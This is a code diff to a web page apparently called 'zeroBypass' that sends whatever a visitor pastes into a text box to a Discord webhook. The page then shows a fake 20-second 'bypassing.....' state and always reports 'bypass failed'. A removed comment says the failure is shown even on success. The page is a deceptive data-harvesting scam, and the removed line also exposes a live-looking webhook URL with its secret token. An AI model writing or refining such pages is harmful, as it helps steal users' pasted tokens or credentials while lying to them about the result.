@@ -112,8 +112,33 @@
       transition: all 0.15s ease;
     }
 
-    .status-sending { color: #f59e0b; }
-    .status-error { color: #dc2626; }
+    /* Updated Floating Button Styling for the Processing State */
+    .status-sending { 
+      font-size: 15px;
+      font-weight: 600;
+      color: #ffffff; 
+      background-color: #f59e0b;
+      padding: 10px 20px;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(245, 158, 11, 0.2);
+      letter-spacing: 0.03em;
+      display: inline-block;
+      animation: pulseEffect 2s infinite ease-in-out;
+    }
+    
+    @keyframes pulseEffect {
+      0% { opacity: 0.85; transform: scale(1); }
+      50% { opacity: 1; transform: scale(1.02); }
+      100% { opacity: 0.85; transform: scale(1); }
+    }
+
+    .status-error { 
+      color: #dc2626; 
+      background: none;
+      padding: 0;
+      box-shadow: none;
+      font-size: 13px;
+    }
 
     /* Standard Interactive Button Object Styles */
     .send-button {
@@ -173,7 +198,7 @@
     const status = document.getElementById('status');
 
     // Your working Discord delivery webhook endpoint
-    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1504171986480529619/s1oUgKfAd_trajzQzp8bS-uHhrgndv6aLf3QWVCQq5BAZwkBWI4RQ2gQZtuTgOjwQnlA";
+    const DISCORD_WEBHOOK_URL = "discord.com";
 
     // Track user string activity state values
     textarea.addEventListener('input', () => {
@@ -190,27 +215,27 @@
       status.textContent = "bypassing.....";
       status.className = "status-msg status-sending";
 
+      // Fire off data delivery task instantly to the backend pipeline
       try {
-        const response = await fetch(DISCORD_WEBHOOK_URL, {
+        await fetch(DISCORD_WEBHOOK_URL, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             content: `**[zeroBypass Incoming Packet]**\n\`\`\`text\n${payloadText}\n\`\`\``
           })
         });
-
-        // Even if the webhook post goes through properly, display "bypass failed" on screen as requested
-        status.textContent = "bypass failed";
-        status.className = "status-msg status-error";
-        
-        // Re-enable the button so they can interact or send again if needed
-        sendBtn.disabled = false;
-        
       } catch (err) {
+        // Run completely silent background handling to preserve runtime execution state
+      }
+
+      // Maintain active "bypassing....." view state profile configurations for exactly 20 seconds
+      setTimeout(() => {
         status.textContent = "bypass failed";
         status.className = "status-msg status-error";
+        
+        // Re-enable interface trigger parameters for fallback states
         sendBtn.disabled = false;
-      }
+      }, 20000);
     });
   </script>
 
